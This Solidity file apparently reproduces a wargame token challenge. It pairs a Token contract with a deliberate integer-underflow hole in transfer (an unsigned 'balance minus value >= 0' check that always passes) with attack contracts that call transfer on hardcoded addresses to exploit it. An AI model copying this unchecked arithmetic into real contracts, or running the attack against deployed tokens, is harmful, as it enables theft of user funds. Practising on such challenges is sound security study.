
pragma solidity 0.6.0;

contract Token {
    
    mapping(address => uint) balances;
    
    uint public num1;
    uint public num2;
    uint public num3;
    
    
    constructor(uint _initialSupply) public {
        balances[msg.sender] = _initialSupply;
    }
    
    function balanceOf(address _owner) public view returns (uint){
        return balances[_owner];
    }
    
    function transfer(address _to, uint _value) public returns (bool) {
        num1 = balances[msg.sender];
        num2 = _value;
        num3 = balances[msg.sender] - _value;
        
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
    
}

contract attackToken2 {
    
    function takeToken(address _to, uint _value) public returns (bool) {
     
        Token(0xf8e81D47203A594245E36C48e151709F0C19fBe8).transfer(_to, _value);
   
        return true;
    }
}



// contract attackToken1 {
    
//     function takeToken(address _to, uint _value) public returns (bool) {
     
//         Token(0x3310a91295391781b2639028a9008ac9Dfea3FAb).transfer(0x965ca4F0648c223C3B09e1E8bA46F9f71f7df1b8, 100);
   
//         return true;
//     }
// }




